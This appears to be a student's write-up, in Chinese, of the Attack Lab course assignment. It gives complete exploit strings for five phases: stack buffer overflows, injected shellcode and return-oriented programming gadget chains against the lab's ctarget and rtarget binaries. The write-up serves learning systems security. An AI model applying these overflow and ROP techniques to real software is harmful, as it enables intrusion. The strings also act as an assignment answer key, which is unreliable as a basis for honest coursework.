<center><font size = 7>Some Notes</font></center>
<p align = 'right'><font size = 3>by Nemo</font></p>
<p align = 'right'><font size = 3>2023.8.17</font></p>

### ctarget
阅读官方文档和汇编代码，我们的目的是使validate函数“顺利”执行，不要执行fail函数
#### phase1
第一个要攻击的文件
> objdump -d ctarget > ctarget.s

找到要攻击的对象getbuf，源码如下（官方文档提供）
```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```
阅读汇编代码，发现
> 4017a8:	48 83 ec 28          sub    $0x28,%rsp

说明开的数组大小为0x28  
根据官方文档，我们需要填充这个大小并让他返回到touch1所在地址  
找到touch1所在地址0x00000000004017c0  
> 要注意你的机器是大端法还是小端法存储数据的，我的机器是小端法，所以touch1地址在机器存储中，地址由低到高排列（和我们读字符串的顺序一致），是0xc017400000000000  

再观察touch1的代码，发现跳到这里就validate了  
所以攻击字符串应该是：（前面40个任意字节）0xc017400000000000  
e.g.
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
创建文件p1.txt，写入攻击字符串，执行
> ./hex2raw < p1.txt | ./ctarget -q

PASS

#### phase2
不仅仅要跳到touch2  
再看touch2的汇编，如果cookie和%edi的值不相等，那么就会调用fail；反之调用validate  
所以我们要做的就是让cookie和%edi相等，这个可以通过注入汇编代码实现  
我们把攻击字符串中加入汇编语句，在程序运行时这些语句会被保存在栈中，我们只需用phase1的方法让程序跳到这个保存的位置，执行完这些语句再跳到想要的地方（touch2）即可  
那么我们怎么知道攻击字符串会保存在哪里呢？  
---> gdb调试  
> gdb ctarget  
> b *0x4017ac(原本Gets执行完返回位置)  
> i r  
> rsp            0x5561dc78

//因为attacklab设计者是关闭了栈随机化的，所以每次运行到0x4017ac时%rsp都为0x5561dc78  
攻击代码：
```
movq $0x59b997fa, %rdi
pushq $0x4017ec          # touch2地址
retq
```
攻击字符串：
```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00   # 前13byte为指令对应的字节码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00   # 跳转到0x5561dc78
```
PASS

//这种方式现在一般不可行，因为操作系统不会让你取栈上的指令

#### phase3
有一个hexmatch函数，我们可以看到最终它是调用了一个字符串比较函数，并返回了两个字符串是否相等。如果这两个字符串相等那么可以顺利调用validate。  
我们读汇编指令可以发现其中一个字符串的地址正是调用hexmatch时%rsi的值，也是调用touch3时%rdi的值  
我们通过gdb调试查看另一个字符串，直接用phase2的攻击字符串即可，更改一下使其跳转到touch3，在字符串匹配函数前打断点，可以得到另一个字符串是"59b997fa"，其地址是0x5561dc13  
所以直接更改phase2，让%rdi的值变为0x5561dc13  
攻击字符串：
```
48 c7 c7 13 dc 61 55 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```
PASS

### rtarget
rtarget做出了两点改动：
1. 栈随机化，每次运行栈地址可能不同
2. 不可执行地址在栈范围内的指令，这意味着注入的新代码是不可运行的

因此，需要新的方法：利用已有代码，一段一段拼凑出我们想要的代码，而不是注入新代码  
具体的说：由于每一个函数都有一个return，ret指令是弹出栈中的一个地址大小的值，把它作为跳转的地址，我们可以在栈中放入许多不同的地址，以此实现在函数中跳来跳去；而我们跳跃的位置可以在函数的ret之前，执行一些命令再进行跳跃，这些命令就可以构成我们的攻击代码  
这种策略叫ROP:Return-Oriented Programming
#### phase4
和phase2一样，需要跳到touch2中并让cookie的值等于%edi的值  
官方文档也给了提示：使用只需start_farm和mid_farm中间的gadget  
可以先把cookie值安插在栈中，用popq指令把它取出，再赋给%edi  
> objdump -d rtarget > rtarget.s

观察rtarget反汇编之后的gadget，根据官方文档的提示，popq指令是以58~5f开头的，我们幸运地在getval_280这个函数中发现了：
> 4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax

里面包含我们想要的58 90 c3  
//这是作者设计巧妙的结果，因为58 90 c3是一个数值的一部分，而我们把它用作指令  
查阅知道58 90 c3表示
```
popq %rax
nop
ret
```
所以可以让我们把栈中预先存放好的cookie值放入%rax中，接下来需要：movq %rax,%rdi或者movl %eax,%edi，对应字节码48 89 c7或者89 c7  
我们刚好在addval_273中找到  
> 4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax

48 89 c7 c3表示
```
movq %rax,%rdi
ret
```
或者我们使用89 c7 c3，表示
```
movl %eax,%edi
ret
```
这样就ok了，写出攻击字符串
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```
//上面a2 19 40 00 00 00 00 00可以换成a3 19 40 00 00 00 00 00  
PASS

#### phase5
和phase3不一样，调试几遍就会发现，hexmatch中要比较的两个字符串的地址，其中一个是%rdi，另外一个是随机的  
但是，那个随机的地址指向的字符串是固定的，是“59b997fa”  
因此我们只能采取另一种方法：把“59b997fa”放在栈中，让%rdi保存此地址  
由于栈随机化，我们不能通过gdb来获取栈的地址  
只能通过mov %rsp,***  
搜索这样的指令，gadget正好有、且仅有这样一条：48 89 e0，即movq %rsp,%rax  
最好的情况是当前这个%rsp就指向“59b997fa”，但是如果我们这么做那么ret指令就会跳到35 39 62 39 39 37 66 61对应的地址，显然会segmentation fault  
只能把“59b997fa”放到别的地址，然后把我们得到的地址加上一个偏移量  
我们看到这个函数：
```c
long add_xy(long x, long y)
{
    return x+y;
}
```
正好可以实现我们的想法  
先movq %rax,%rdi  
下一步就是要让%rsi = offset  
我们可以巧妙地把offset存到栈中，像phase2那样使用popq取出来  
然后一步一步地把offset放到%rsi中（官方文档也提示了，由于offset不大，所以movq和movl没差）  
然后调用add_xy()  
然后movq %rax,%rdi  
然后调用touch3()  
就ok了  
攻击代码：
```
movq %rsp,%rax
movq %rax,%rdi
popq %rax
movl %eax,%edx
movl %edx,%ecx
movl %ecx,%esi
add_xy()
movq %rax,%rdi
touch3()
```
攻击字符串：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```
PASS  
至此AttackLab结束

<p align = 'right'><font size = 3>by Nemo</font></p>
<p align = 'right'><font size = 3>2023.8.23</font></p>